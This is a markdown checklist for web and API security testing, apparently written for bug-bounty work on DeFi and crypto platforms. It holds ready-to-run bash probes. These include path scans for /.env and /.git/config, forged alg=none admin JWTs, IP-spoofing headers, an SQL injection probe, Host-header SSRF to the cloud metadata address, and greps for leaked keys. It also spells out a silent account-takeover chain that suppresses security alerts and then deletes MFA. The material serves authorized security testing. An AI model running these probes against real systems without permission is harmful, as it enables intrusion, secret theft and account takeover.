# WEB-API-CHECKLIST.md — Web & API Attack Surface

Execute for every protocol with a web application or API. Each section is independent — run in parallel when possible.

---

## W1: Endpoint Discovery Patterns

**Probe 50+ paths on every target domain.**

```bash
TARGET="https://{domain}"

# === OpenAPI/Swagger ===
for path in /openapi.json /openapi.yaml /swagger.json /swagger.yaml /api/openapi.json /api/v1/openapi.json /api/v2/openapi.json /v1/openapi.json /v2/openapi.json /api/docs /docs /api-docs /v1/api-docs /swagger /swagger-ui /swagger-ui.html /redoc /api/schema /api/spec /.well-known/openapi.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[OPENAPI] $code $path"
done

# === GraphQL ===
for path in /graphql /graphiql /graphql/console /graphql/playground /api/graphql /v1/graphql /graphql/schema; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[GRAPHQL] $code $path"
done

# GraphQL introspection
curl -s -X POST "${TARGET}/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name fields{name}}}}"}' | jq .

# === Admin/Debug ===
for path in /admin /admin/ /administrator /dashboard /internal /debug /debug/vars /debug/pprof /debug/pprof/goroutine /debug/pprof/heap /debug/requests /_debug /__debug /devtools /console /backstage /backoffice; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[ADMIN] $code $path"
done

# === Infrastructure/Health ===
for path in /health /healthz /ready /readiness /liveness /ping /status /info /version /env /config /metrics /prometheus /actuator /actuator/health /actuator/info /actuator/env /actuator/beans /actuator/mappings /actuator/configprops /actuator/trace /_internal /server-status /server-info; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[INFRA] $code $path"
done

# === Auth ===
for path in /auth /auth/login /auth/signup /auth/register /auth/verify /auth/nonce /auth/callback /auth/token /auth/refresh /auth/logout /auth/forgot-password /auth/reset-password /login /signup /register /oauth /oauth/authorize /oauth/token /api/auth/nonce /api/auth/verify /siwe /api/siwe; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[AUTH] $code $path"
done

# === Security ===
for path in /.well-known/security.txt /security.txt /.well-known/openid-configuration /robots.txt /sitemap.xml /.env /.git/config /.git/HEAD /api/v1/users /api/v1/admin; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[SECURITY] $code $path"
done

# === User/Account ===
for path in /user /users /me /profile /account /settings /preferences /api/user /api/users /api/me /api/account /api/profile /api/settings; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[USER] $code $path"
done

# === DeFi-Specific ===
for path in /api/vaults /api/markets /api/prices /api/tvl /api/rewards /api/strategies /api/positions /api/portfolio /api/deposit /api/withdraw /api/swap /api/bridge /api/stake /api/unstake /api/claim /api/governance /api/proposals /api/vote; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && [ "$code" != "405" ] && echo "[DEFI] $code $path"
done
```

**For each non-404 response:**
1. Save full response: `curl -sD- ${TARGET}${path} > evidence/web/api-responses/discovery-{slug}.txt`
2. Categorize by risk level
3. Note auth requirement (tested with/without token)
4. Add to SURFACE-MAP.md

---

## W2: Auth Bypass Templates

**15 vectors. Execute ALL before marking "secure."**

```bash
API="https://{api_domain}"
EP="/protected/endpoint"

# 1. No auth
curl -s -w "\n%{http_code}" "${API}${EP}"

# 2. Empty auth header
curl -s -w "\n%{http_code}" -H "Authorization: " "${API}${EP}"

# 3. Bearer without token
curl -s -w "\n%{http_code}" -H "Authorization: Bearer" "${API}${EP}"

# 4. Bearer null
curl -s -w "\n%{http_code}" -H "Authorization: Bearer null" "${API}${EP}"

# 5. Wrong token type
curl -s -w "\n%{http_code}" -H "Authorization: Basic dGVzdDp0ZXN0" "${API}${EP}"

# 6. JWT alg=none
NONE_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n '{"sub":"admin","iat":99999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=').
curl -s -w "\n%{http_code}" -H "Authorization: Bearer ${NONE_JWT}" "${API}${EP}"

# 7. Method override
curl -s -w "\n%{http_code}" -X GET -H "X-HTTP-Method-Override: POST" "${API}${EP}"
curl -s -w "\n%{http_code}" -X GET -H "X-HTTP-Method: POST" "${API}${EP}"

# 8. Path traversal
curl -s -w "\n%{http_code}" "${API}/public/../${EP#/}"
curl -s -w "\n%{http_code}" "${API}${EP}%00"
curl -s -w "\n%{http_code}" "${API}${EP}/.."

# 9. IP spoofing headers
curl -s -w "\n%{http_code}" -H "X-Forwarded-For: 127.0.0.1" "${API}${EP}"
curl -s -w "\n%{http_code}" -H "X-Real-IP: 127.0.0.1" "${API}${EP}"
curl -s -w "\n%{http_code}" -H "X-Original-URL: ${EP}" "${API}/"
curl -s -w "\n%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" "${API}${EP}"

# 10. Parameter injection
curl -s -w "\n%{http_code}" "${API}${EP}?admin=true"
curl -s -w "\n%{http_code}" "${API}${EP}?debug=1"
curl -s -w "\n%{http_code}" "${API}${EP}?internal=1"

# 11. Content-Type manipulation
curl -s -w "\n%{http_code}" -X POST -H "Content-Type: text/plain" -d 'test' "${API}${EP}"
curl -s -w "\n%{http_code}" -X POST -H "Content-Type: application/xml" -d '<root/>' "${API}${EP}"

# 12. CORS check
curl -sI -H "Origin: https://evil.com" "${API}${EP}" | grep -i access-control
curl -sI -H "Origin: null" "${API}${EP}" | grep -i access-control

# 13. API version downgrade
for ver in v0 v1 v2 beta alpha internal; do
  curl -s -w " [${ver}]\n%{http_code}\n" "${API}/${ver}${EP}"
done

# 14. WebSocket bypass
# wscat -c "wss://{domain}/ws"
# Try REST-equivalent messages over WS without auth

# 15. Case/encoding variants
curl -s -w "\n%{http_code}" "${API}$(echo ${EP} | tr '[:lower:]' '[:upper:]')"
curl -s -w "\n%{http_code}" "${API}$(echo ${EP} | sed 's/\//%2f/g')"
```

**Result tracking:**
```markdown
| # | Vector | Code | Body Summary | Finding? |
|---|--------|------|-------------|----------|
| 1 | No auth | | | |
| 2 | Empty auth | | | |
| 3 | Bearer empty | | | |
| 4 | Bearer null | | | |
| 5 | Wrong type | | | |
| 6 | JWT none | | | |
| 7 | Method override | | | |
| 8 | Path traversal | | | |
| 9 | IP spoof | | | |
| 10 | Param inject | | | |
| 11 | Content-Type | | | |
| 12 | CORS | | | |
| 13 | Version downgrade | | | |
| 14 | WebSocket | | | |
| 15 | Encoding | | | |
```

---

## W3: SIWE Compliance Checklist (EIP-4361)

### Step 1: Get Nonce
```bash
curl -s "https://{api}/auth/nonce" | jq . > evidence/web/api-responses/siwe-nonce.json
```

### Step 2: Nonce Uniqueness
```bash
for i in $(seq 1 5); do
  curl -s "https://{api}/auth/nonce" | jq -r '.nonce // .data // .'
done | sort | uniq -d
# Any duplicates → FINDING: Predictable/reused nonce
```

### Step 3: Field Validation Matrix
Sign message with each field intentionally WRONG, attempt verification:

| Field | Attack Value | Expected Result | Actual Result | Finding? |
|-------|-------------|-----------------|---------------|----------|
| `domain` | `evil.com` | Reject | | |
| `address` | Different wallet | Reject | | |
| `chainId` | Wrong chain (1→5) | Reject | | |
| `nonce` | Previous nonce | Reject | | |
| `issuedAt` | 1 year ago | Reject | | |
| `expirationTime` | Past date | Reject | | |
| `uri` | Different URI | Reject | | |
| `version` | `0` | Reject | | |

### Step 4: Session Handling
```
- Is session token a JWT? (decode, check claims)
- Does session expire? (wait, retry)
- Can session be reused across domains?
- Is session invalidated on wallet disconnect?
- Can session be used from different IP?
```

---

## W4: JS Bundle Analysis

### Download
```bash
TARGET="${1:?Usage: $0 https://app.example.com}"
OUTDIR="evidence/web/js-bundles"
mkdir -p "$OUTDIR"

curl -sL "$TARGET/" -o "$OUTDIR/index.html"

# Extract JS URLs
grep -oP '(?:src|href)="([^"]*\.(?:js|mjs|chunk\.js)[^"]*)"' "$OUTDIR/index.html" | \
  sed 's/.*="\(.*\)"/\1/' > "$OUTDIR/js-urls.txt"

# Download each
while read -r js; do
  case "$js" in
    http*) url="$js" ;;
    //*) url="https:$js" ;;
    /*) url="${TARGET}${js}" ;;
    *) url="${TARGET}/${js}" ;;
  esac
  fname=$(echo "$js" | sed 's/[^a-zA-Z0-9._-]/_/g')
  curl -sL "$url" -o "$OUTDIR/$fname"
done < "$OUTDIR/js-urls.txt"

cat "$OUTDIR"/*.js > "$OUTDIR/all-bundles.js" 2>/dev/null
echo "Total: $(wc -c < "$OUTDIR/all-bundles.js") bytes, $(wc -l < "$OUTDIR/js-urls.txt") files"
```

### Search (30+ patterns)
```bash
F="evidence/web/js-bundles/all-bundles.js"

# Secrets
grep -oP '(?:api[_-]?key|apiKey|API_KEY|secret|SECRET)["\s:=]+["\x27]([a-zA-Z0-9_\-]{16,})["\x27]' "$F"
grep -oP '0x[a-fA-F0-9]{64}' "$F"
grep -oP 'Bearer [a-zA-Z0-9._\-]{20,}' "$F"
grep -oP 'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*' "$F"
grep -iP '(?:password|passwd|pwd|master_key)["\s:=]+["\x27]([^"\x27]{4,})["\x27]' "$F"
grep -oP 'AKIA[A-Z0-9]{16}' "$F"
grep -oP 'AIza[a-zA-Z0-9_\\-]{35}' "$F"

# Endpoints & domains
grep -oP 'https?://[a-zA-Z0-9._-]+\.(internal|local|dev|staging|test|corp)\b[^\s"]*' "$F"
grep -oP 'https?://api\.[a-zA-Z0-9._-]+[^\s"]*' "$F" | sort -u
grep -oP '"/api/[a-zA-Z0-9/_-]+"' "$F" | sort -u
grep -oP 'wss?://[^\s"]+' "$F" | sort -u
grep -oP 'https?://[^\s"]+/graphql' "$F" | sort -u

# Blockchain
grep -oP '0x[a-fA-F0-9]{40}' "$F" | sort -u
grep -oP 'https://[a-z]+\.(g\.alchemy|infura|quiknode|ankr|publicnode)\.(io|com)/[^\s"]*' "$F"
grep -oP '(?:owner|admin|operator|relayer|treasury|fee|deployer)["\s:]+["\x27]?(0x[a-fA-F0-9]{40})' "$F"
grep -oP 'chainId["\s:]+([0-9]+)' "$F" | sort -u

# Infrastructure
grep -oP 'https://[a-f0-9]+@[a-z0-9.]+\.sentry\.io/[0-9]+' "$F"
grep -oP 'https://[a-zA-Z0-9]+\.supabase\.co' "$F"
grep -oP 'https://[a-zA-Z0-9-]+\.firebaseio\.com' "$F"
grep -oP 'projectId["\s:]+["\x27]([a-f0-9]{32})["\x27]' "$F"
grep -oP 'process\.env\.[A-Z_]+' "$F" | sort -u
grep -oP 'import\.meta\.env\.[A-Z_]+' "$F" | sort -u

# All third-party domains
grep -oP 'https?://[a-zA-Z0-9._-]+\.[a-z]{2,}' "$F" | sed 's|https\?://||' | sed 's|/.*||' | sort -u
```

---

## W5: Database Write Detection

```bash
UNIQUE="gd-probe-$(date +%s)-$(head -c 4 /dev/urandom | xxd -p)"

# Step 1: POST unique value (with auth)
curl -s -X POST "https://{api}/endpoint" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer {token}" \
  -d "{\"name\": \"${UNIQUE}\"}" \
  -o evidence/web/api-responses/write-test-authed.json

# Step 2: GET and check persistence
curl -s "https://{api}/endpoint" | grep -c "${UNIQUE}"
# Found → confirmed write

# Step 3: POST unique value (WITHOUT auth)
curl -s -X POST "https://{api}/endpoint" \
  -H "Content-Type: application/json" \
  -d "{\"name\": \"${UNIQUE}-noauth\"}" \
  -o evidence/web/api-responses/write-test-noauth.json

# Step 4: GET and check
curl -s "https://{api}/endpoint" | grep -c "${UNIQUE}-noauth"
# Found → CRITICAL: Unauthenticated write
```

**For different API styles:**
| Style | Write | Verify |
|-------|-------|--------|
| REST | `POST /resource` | `GET /resource/{id}` |
| GraphQL | `mutation { create(...) }` | `query { resource(id: ...) }` |
| RPC | `POST /rpc method:"create"` | `POST /rpc method:"get"` |

---

## W6: Infrastructure Intelligence Extraction

### From Health Endpoints
```bash
for ep in /health /healthz /ready /status /info /version /ping; do
  resp=$(curl -s --max-time 5 "https://{domain}${ep}")
  [ -n "$resp" ] && [ "$resp" != "Not Found" ] && echo "=== ${ep} ===" && echo "$resp" | jq . 2>/dev/null || echo "$resp"
done
```

**Extract:**
| Field | Intelligence |
|-------|-------------|
| `version` | Software version → CVE lookup |
| `uptime` | Restart patterns |
| `database` | DB technology |
| `commit`/`sha` | Exact deployed version |
| `environment` | Prod/staging/dev |

### From Error Responses
```bash
# Type error
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d '{"id":"not_int"}'
# Missing field
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d '{}'
# Oversized
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d "{\"x\":\"$(head -c 100000 /dev/urandom | base64 -w0)\"}"
# SQL probe
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d "{\"id\":\"1' OR '1'='1\"}"
```

**Extract from errors:** stack traces (file paths), ORM/DB names, framework versions, internal IPs, env var names, third-party service errors.

### From Response Headers
```bash
curl -sI "https://{domain}/" | grep -iE "^(server|x-powered|x-frame|content-security|strict-transport|x-content-type|x-xss|referrer-policy|permissions-policy|access-control|x-request-id|via|cf-ray|set-cookie):"
```

**Security header checklist:**
| Header | Present? | Value | Risk if Missing |
|--------|----------|-------|----------------|
| Strict-Transport-Security | | | MITM |
| Content-Security-Policy | | | XSS |
| X-Frame-Options | | | Clickjacking |
| X-Content-Type-Options | | | MIME sniffing |
| Referrer-Policy | | | Info leak |
| CORS (Access-Control-*) | | | Cross-origin attacks |

---

---

## W7: Framework-Specific CVE Quick Checks (NEW 2026)

**Run IMMEDIATELY after fingerprinting the web framework in W6.**

```bash
TARGET="https://{domain}"

# === Next.js Detection + Checks ===
# If _next/ paths or __NEXT_DATA__ found → activate NEXTJS-HUNT-CHECKLIST.md
curl -s "${TARGET}" | grep -q '__NEXT_DATA__\|/_next/' && echo "[NEXTJS] Detected → run NEXTJS-HUNT-CHECKLIST.md"

# === SvelteKit + Vercel Detection (SvelteSpill CVE-2026-27118) ===
curl -sI "${TARGET}" | grep -qi 'x-sveltekit\|svelte' && echo "[SVELTEKIT] Detected"
# Cache deception test: __pathname rewrite
curl -s "${TARGET}/?__pathname=/api/auth/session" -D- | head -20

# === Astro Detection (CVE-2026-25545 SSRF, CVE-2025-64525 URL manipulation) ===
curl -sI "${TARGET}" | grep -qi 'astro' && echo "[ASTRO] Detected"
# Host header SSRF
curl -s "${TARGET}/nonexistent" -H "Host: 169.254.169.254" -D- | head -20
# x-forwarded-proto manipulation
curl -s "${TARGET}" -H "x-forwarded-proto: http" -H "x-forwarded-port: 1337" -D- | head -10

# === Angular SSR (CVE-2025-59052 race condition data leak) ===
curl -sI "${TARGET}" | grep -qi 'angular\|ng-' && echo "[ANGULAR] Detected — check SSR race condition CVE-2025-59052"

# === Nuxt (CVE-2025-27415 cache poisoning) ===
curl -s "${TARGET}" | grep -q 'nuxt\|__nuxt' && echo "[NUXT] Detected"
curl -s "${TARGET}/?/_payload.json" -D- | head -20  # Cache poison test

# === Cross-Site WebSocket Hijacking (any framework with WS) ===
# Check for WebSocket endpoints
curl -sI "${TARGET}" -H "Upgrade: websocket" -H "Connection: Upgrade" | head -5
for ws_path in /ws /socket /socket.io /graphql-ws /realtime /feed /stream; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${ws_path}" -H "Upgrade: websocket" -H "Connection: Upgrade")
  [ "$code" != "000" ] && [ "$code" != "404" ] && echo "[WS] $code $ws_path"
done
```

**Framework CVE Quick Reference (2025-2026):**

| Framework | CVE | Type | CVSS | Check |
|-----------|-----|------|------|-------|
| React/Next.js | CVE-2025-55182 | RCE (React2Shell) | 10.0 | → NEXTJS-HUNT-CHECKLIST.md |
| Next.js | CVE-2025-29927 | Middleware bypass | 9.1 | x-middleware-subrequest header |
| SvelteKit | CVE-2026-27118 | Cache deception | HIGH | __pathname param on Vercel |
| Astro | CVE-2026-25545 | SSRF | HIGH | Host header injection |
| Astro | CVE-2025-64525 | URL manipulation | HIGH | x-forwarded-proto/port |
| Angular SSR | CVE-2025-59052 | Data leak (race) | 7.1 | Concurrent SSR requests |
| Nuxt | CVE-2025-27415 | Cache poisoning | 7.5 | ?/_payload.json |

---

## W8: Authenticated Surface Testing & Authorization Consistency (MANDATORY)

**This is the most commonly skipped step and the source of the most missed findings.**

A WAF/CDN returning 403 on unauthenticated requests does NOT mean the API is inaccessible. It means it requires a valid session token. The entire authenticated surface remains untested if you never log in.

**Lesson learned:** Request Finance — 103 routes extracted from JS bundle including `DELETE /users/mfa`. All noted as "high-value" but never tested with authentication because WAF returned 403 on unauthenticated probes. A single authenticated curl would have revealed MFA deletion without re-auth (CVSS 7.6 HIGH).

### Step 1: Acquire Session Token

```bash
# Via browser DevTools (works for ANY auth mechanism):
# 1. Open target app in browser
# 2. Create account / login normally
# 3. DevTools → Network → find API request → copy Authorization header
# 4. Save token:
TOKEN="<captured_bearer_token>"
API="https://{api_domain}"

# Verify token works:
curl -s -w "\n%{http_code}" "${API}/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Network: live"
# 200 = token valid. 401/403 = token expired or wrong domain.

# Decode JWT payload:
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{scope, exp, aud, iss, sub}'
```

### Step 2: Scan ALL Routes from Bundle with Token

```bash
# Use routes extracted during W4 JS bundle analysis
# Test each with the authenticated token:
for route in $(grep -oP '"/[a-zA-Z0-9/_-]+"' evidence/web/js-bundles/all-bundles.js | tr -d '"' | sort -u); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${API}${route}" \
    -H "Authorization: Bearer $TOKEN" -H "X-Network: live" --max-time 10 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && echo "$code $route"
done | tee evidence/web/api-responses/authed-route-scan.txt
```

### Step 3: Authorization Consistency Matrix

**The highest-ROI test in web API security research.**

For targets using elevated auth (sudo scope, re-auth, MFA challenge):

```bash
echo "=== SECURITY-CRITICAL (should require sudo/re-auth) ==="
# MFA delete
curl -s -o /dev/null -w "%{http_code} DELETE /users/mfa\n" \
  -X DELETE "${API}/users/mfa" -H "Authorization: Bearer $TOKEN"
# SSO unlink
curl -s -o /dev/null -w "%{http_code} DELETE /users/accounts/google\n" \
  -X DELETE "${API}/users/accounts/google" -H "Authorization: Bearer $TOKEN"
# Password change
curl -s -o /dev/null -w "%{http_code} PATCH /users {password}\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{"password":"NewP@ss123"}'
# Email change
curl -s -o /dev/null -w "%{http_code} PATCH /users {email}\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{"email":"test@test.com"}'
# Account delete
curl -s -o /dev/null -w "%{http_code} DELETE /users\n" \
  -X DELETE "${API}/users" -H "Authorization: Bearer $TOKEN"
# Session revocation
curl -s -o /dev/null -w "%{http_code} DELETE /auth/sessions\n" \
  -X DELETE "${API}/auth/sessions" -H "Authorization: Bearer $TOKEN"
# Security notification suppression
curl -s -o /dev/null -w "%{http_code} PATCH /users {disabledEmails}\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"disabledEmails":["emailChangeConfirmation","emailChangeAlert"]}'

echo ""
echo "=== NON-SECURITY (baseline for comparison) ==="
curl -s -o /dev/null -w "%{http_code} GET /users\n" \
  "${API}/users" -H "Authorization: Bearer $TOKEN"
curl -s -o /dev/null -w "%{http_code} GET /apps\n" \
  "${API}/apps" -H "Authorization: Bearer $TOKEN"
```

**Build matrix:**

| Operation | Sensitivity | Standard Token | Sudo/Re-auth | Finding? |
|-----------|------------|----------------|--------------|----------|
| DELETE MFA | CRITICAL | ? | ? | |
| DELETE SSO | CRITICAL | ? | ? | |
| Change email | HIGH | ? | ? | |
| Change password | HIGH | ? | ? | |
| Delete account | HIGH | ? | ? | |
| Suppress notifications | MEDIUM | ? | ? | |
| View apps | LOW | ? | ? | |
| Update preferences | LOW | ? | ? | |

**If a LOW operation requires higher auth than a CRITICAL one → proven oversight → HIGH finding.**

### Step 4: Notification Suppression as Attack Enabler

```bash
# Can security-critical notifications be disabled?
curl -s -X PATCH "${API}/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"disabledEmails":["emailChangeConfirmation","emailChangeAlert","loginFromNewDevice","passwordChanged","mfaDisabled"]}' | jq '.disabledEmails'

# If accepted: combined with MFA deletion = SILENT account takeover chain:
# 1. Suppress alerts (PATCH /users disabledEmails) → no notification
# 2. Delete MFA (DELETE /users/mfa) → second factor removed
# 3. Unlink SSO (DELETE /users/accounts/google) → fallback removed
# 4. Victim receives ZERO notifications
```

---

## W9: CSP Depth Assessment

**Not a checkbox — CSP is a severity multiplier for every other finding.**

```bash
TARGET="https://{domain}"

# Step 1: Extract full CSP
CSP=$(curl -sI "$TARGET" | grep -i 'content-security-policy' | sed 's/content-security-policy: //i')
echo "CSP: $CSP"

# Step 2: Directive inventory
for dir in script-src default-src object-src base-uri frame-ancestors style-src img-src connect-src font-src worker-src frame-src; do
  echo "$CSP" | grep -oP "${dir}[^;]+" || echo "${dir}: ABSENT"
done

# Step 3: XSS vector class assessment
echo "=== XSS vectors blocked/unblocked ==="
echo "$CSP" | grep -q "script-src" && echo "script-src: PRESENT" || echo "script-src: ABSENT → inline scripts, eval(), event handlers ALL work"
echo "$CSP" | grep -q "'unsafe-inline'" && echo "unsafe-inline: PRESENT → inline scripts work despite CSP"
echo "$CSP" | grep -q "'unsafe-eval'" && echo "unsafe-eval: PRESENT → eval() works despite CSP"
echo "$CSP" | grep -q "'strict-dynamic'" && echo "strict-dynamic: PRESENT"
echo "$CSP" | grep -q "trusted-types" && echo "Trusted Types: ENFORCED" || echo "Trusted Types: NOT enforced"

# Step 4: External script SRI audit
echo "=== SRI Coverage ==="
TOTAL=$(curl -s "$TARGET" | grep -oP '<script[^>]+src="[^"]+"' | wc -l)
WITH_SRI=$(curl -s "$TARGET" | grep -oP '<script[^>]+integrity="[^"]+"' | wc -l)
echo "External scripts: $TOTAL total, $WITH_SRI with SRI, $((TOTAL - WITH_SRI)) WITHOUT SRI"

# Step 5: Document as severity multiplier
```

**Assessment matrix:**

| CSP State | Impact on findings |
|-----------|-------------------|
| No script-src, no default-src | CRITICAL amplifier — every XSS vector class works, every finding with XSS prereq becomes low-barrier |
| script-src 'unsafe-inline' | HIGH amplifier — inline XSS works |
| script-src with nonces only | MODERATE — reflected/stored XSS still possible but DOM XSS blocked |
| script-src 'strict-dynamic' + nonces | LOW — only nonce-bearing scripts execute |
| Trusted Types enforced | MINIMAL — even with script execution, DOM XSS sinks are hardened |

**SRI gap as attack vector:**
Each external script WITHOUT SRI = potential CDN compromise vector. Precedents: Curve $3.5M (May 2025), Aerodrome $700K (Nov 2025), npm chalk/debug Sep 2025.

**Reference:** Crypto.com WC-027 — `frame-ancestors 'self'; upgrade-insecure-requests;` only. No script-src, default-src, object-src, base-uri. 34/35 external scripts without SRI. This single gap turned every crypto finding from "theoretical" to "one CDN compromise away."

---

## W10: PostMessage Handler Enumeration

**Run on EVERY web target. PostMessage without origin checks = cross-origin API trigger.**

```bash
F="evidence/web/js-bundles/all-bundles.js"

# Step 1: Count handlers
echo "postMessage handlers:"
grep -c 'addEventListener.*"message"\|addEventListener.*\x27message\x27\|onmessage\s*=' "$F"

# Step 2: Extract handler context (30 lines around each)
grep -n -B5 -A30 'addEventListener.*"message"' "$F" > evidence/web/postmessage-handlers-raw.txt

# Step 3: Check origin validation
echo "=== Handlers WITH origin check ==="
grep -B2 -A30 'addEventListener.*"message"' "$F" | grep -c 'origin'
echo "=== Handlers WITHOUT origin check ==="
# Manual review of each handler in postmessage-handlers-raw.txt

# Step 4: Map handler→API chains
# For each handler: what fetch/XHR calls does it trigger?
# Are attacker-controlled values (from event.data) used in API URLs or request bodies?
```

**For each handler, document:**

| Handler | Origin Check? | Triggers API Call? | Attacker-Controlled Params? | Severity |
|---------|--------------|-------------------|---------------------------|----------|
| FiatWalletTopUp | NO | GET /fiat_wallets/transactions/{tx_id} | transaction_id | CRITICAL |
| paymentGateway | NO | cache invalidation | — | LOW |

**Reference:** Crypto.com WC-004 — 7 handlers, 0 origin checks. WC-021: cross-origin postMessage triggered authenticated API call with attacker-controlled transaction_id. WC-022: error 0002 from cross-origin triggered infinite KYC token refresh loop.

---

## W11: Feature Flag SDK Detection

```bash
F="evidence/web/js-bundles/all-bundles.js"

# Detect SDKs
grep -oP 'growthbook|launchdarkly|split\.io|optimizely|vwo|amplitude' "$F" | sort -u

# Extract SDK keys
grep -oP 'sdk-[a-zA-Z0-9]+' "$F"          # GrowthBook
grep -oP 'sdk_[a-f0-9]+' "$F"              # LaunchDarkly
grep -oP 'client-[a-f0-9]+' "$F"           # Split

# Check DOM mutation capability
grep -n '_applyDOMChanges\|innerHTML.*\.js\|visual.editor\|dom.changes' "$F"

# Check CORS on config endpoints (replace SDK_KEY)
curl -sI "https://cdn.growthbook.io/sub/<SDK_KEY>" | grep -i access-control
curl -sI "https://cdn.growthbook.io/api/features/<SDK_KEY>" | grep -i access-control
```

**If SDK found with DOM mutation + wildcard CORS:** Document as XSS vector in CSP assessment (W9).

---

## Execution Order

1. **W1** first — discover all endpoints
2. **W4** in parallel — download and analyze JS bundles
3. **W7** immediately after framework detection — check framework-specific CVEs
4. **If Next.js detected** → activate full `NEXTJS-HUNT-CHECKLIST.md`
5. **W9** after W4 — CSP depth assessment + SRI audit (severity multiplier for ALL other findings)
6. **W10** after W4 — PostMessage handler enumeration
7. **W11** after W4 — Feature flag SDK detection
8. **W2** on every authenticated endpoint from W1
9. **W3** if SIWE/Web3 auth detected
10. **W5** on every write-capable endpoint
11. **W6** throughout — extract infra intel from every response
12. **W8** MANDATORY — acquire authenticated session and run authorization consistency matrix
13. **W12** MANDATORY when exotic encodings detected — activate Injection Proxy Bridge (`~/Desktop/BUGS/injection-proxy/`). Auto-triggers: base64 blobs, CBOR/msgpack/protobuf/gRPC content types, JWT injectable claims, XML/ISO 20022 bodies, WebAuthn, nested encodings. Run `python3 proxy.py --detect "<value>"` → create profile → route sqlmap/ffuf/nuclei through proxy. See DEEP-ANALYSIS §4.13.
